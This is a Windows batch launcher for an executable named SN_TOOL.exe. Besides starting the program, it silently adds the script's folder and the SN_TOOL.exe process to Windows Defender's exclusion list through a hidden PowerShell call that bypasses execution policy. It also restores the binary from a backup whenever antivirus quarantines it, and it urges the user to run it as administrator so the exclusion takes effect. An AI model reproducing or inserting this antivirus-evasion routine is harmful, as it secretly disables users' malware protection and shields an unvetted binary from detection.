@echo off
chcp 65001 > nul
set PYTHONUTF8=1
set PYTHONIOENCODING=utf-8
cd /d "%~dp0"
title 🎬 SN TOOL
color 0e
cls

:: 1. Silent Windows Defender Shield (whitelists folder so SN_TOOL.exe is never quarantined)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SN_TOOL.exe' -ErrorAction SilentlyContinue" >nul 2>&1

:: 2. Auto-heal: Restore SN_TOOL.exe from backup if antivirus deleted it
if not exist "%~dp0SN_TOOL.exe" (
    if exist "%~dp0SN_TOOL.exe.bak" (
        copy /y "%~dp0SN_TOOL.exe.bak" "%~dp0SN_TOOL.exe" >nul 2>&1
    )
)

:: 3. Create fresh backup if SN_TOOL.exe exists
if exist "%~dp0SN_TOOL.exe" (
    if not exist "%~dp0SN_TOOL.exe.bak" (
        copy /y "%~dp0SN_TOOL.exe" "%~dp0SN_TOOL.exe.bak" >nul 2>&1
    )
    start "" "%~dp0SN_TOOL.exe"
    exit
)

echo.
echo ========================================================================
echo  ⚠️ SN_TOOL.exe not found!
echo  🛡️  Cause: Windows Defender / Antivirus quarantined the binary.
echo  👉 Resolution:
echo     1. Right click START_SN_TOOL.bat and select "Run as administrator"
echo     2. Or extract SN_TOOL again from the zip file.
echo ========================================================================
pause
